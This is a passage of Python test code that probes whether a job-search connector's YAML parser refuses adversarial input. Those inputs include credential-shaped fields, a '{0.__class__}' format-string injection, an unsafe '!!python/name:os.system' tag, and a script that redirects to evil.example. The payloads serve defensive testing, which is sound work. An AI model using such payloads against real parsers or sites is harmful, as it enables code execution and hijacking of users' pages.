            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 6. A field name that IS a credential — rejected for not being in the
    #    closed field vocabulary, independent of whether 'password' *looks*
    #    dangerous.
    must_be_refused(
        "a 'password' field is accepted as a connector field",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n    password: {css: '.secret'}\n"
        ),
    )

    # 7. A credential-shaped top-level key.
    must_be_refused(
        "a top-level 'api_key' is accepted instead of refused",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "api_key: 'sk-does-not-belong-here'\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 8. An `auth` value other than "none"/"candidate_session" — the only two
    #    the Literal allows — must be refused, closing off e.g. `auth: basic`
    #    plus an implied (even if absent today) credential field later.
    must_be_refused(
        "auth: password is accepted as an authentication mode",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "auth: password\n"
            "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
            "  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 9. A url_pattern carrying a format-string attribute-access payload
    #    alongside the legitimate placeholder — refused at load by the
    #    dedicated validator, not merely left un-formatted.
    must_be_refused(
        "a url_pattern with an extra brace group loads successfully",
        lambda: parse_connector(
            "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
            "list:\n  url_pattern: 'https://x.test?p={page}&x={0.__class__}'\n"
            "  item: '.job'\n  fields:\n    text: {css: '.x'}\n"
        ),
    )

    # 10. `<script>` markup embedded in a fixture must come through as inert
    #     text if a selector happens to match it — never executed (there is
    #     no JS engine here to execute it in the first place, but the
    #     assertion is that its content is returned unchanged as a string).
    probes += 1
    connector = parse_connector(
        "site: acme\nlocale: en\nversion: '1.0.0'\nlast_verified: '2026-01-01'\n"
        "list:\n  url_pattern: 'https://x.test'\n  item: '.job'\n"
        "  fields:\n    text: {css: 'script'}\n"
    )
    payload = "alert('should never run'); window.location='https://evil.example'"
    html = f"<div class='job'><script>{payload}</script></div>"
    records = parse_list_page(connector, html)
    if not records or records[0].get("text") != payload:
        violations.append("script content was not returned as inert text")

    # 11. A malformed connector (missing every required field) must be
    #     refused rather than silently defaulting.
    must_be_refused(
        "an empty mapping is accepted as a connector",
        lambda: parse_connector("{}"),
    )

    # 12. `!!python/name` — a different unsafe tag family — must also fail to
    #     load, not just the `/object/apply` shape probe 1 already covers.
    must_be_refused(
        "!!python/name tag resolves a name instead of failing to load",
        lambda: parse_connector("site: !!python/name:os.system\nlocale: en\n"),
    )

    return ProbeReport(probes_run=probes, violations=tuple(violations))


# A run that tried fewer than this measured nothing — the same "pass over
# nothing is not a pass" floor `identity.py`'s `MINIMUM_PROBES` enforces.
MINIMUM_PROBES = 10


def write_evidence(evidence: Path = DEFAULT_EVIDENCE_PATH) -> dict[str, Any]:
    """Measure `connector_executes_no_shared_code` and record it.

    `1` means every adversarial attempt in `probe_connector_isolation` was
    refused; `0` means at least one was not — the flag is never a vacuous
    pass, because `_main` refuses to report it at all when too few probes ran.
    """
    report = probe_connector_isolation()
    measured: dict[str, Any] = {
        "connector_executes_no_shared_code": 1 if not report.violations else 0,
        "probes_run": report.probes_run,
        "violations": list(report.violations),
    }
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text(json.dumps(measured, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return measured


def _main(argv: list[str]) -> int:
    """`python -m jobsearch.connectors [path]` → T32's gate evidence."""
    positional = [arg for arg in argv[1:] if not arg.startswith("--")]
    target = Path(positional[0]) if positional else DEFAULT_EVIDENCE_PATH
    measured = write_evidence(target)
    print(json.dumps(measured, ensure_ascii=False))
    if measured["probes_run"] < MINIMUM_PROBES:
        print(
            f"only {measured['probes_run']} probe(s) ran (floor {MINIMUM_PROBES}) — "
            "a pass over nothing is not a pass",
            file=sys.stderr,
        )
        return 3
    for violation in measured["violations"]:
        print(f"connector isolation breach: {violation}", file=sys.stderr)
    return 1 if measured["violations"] else 0


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv))
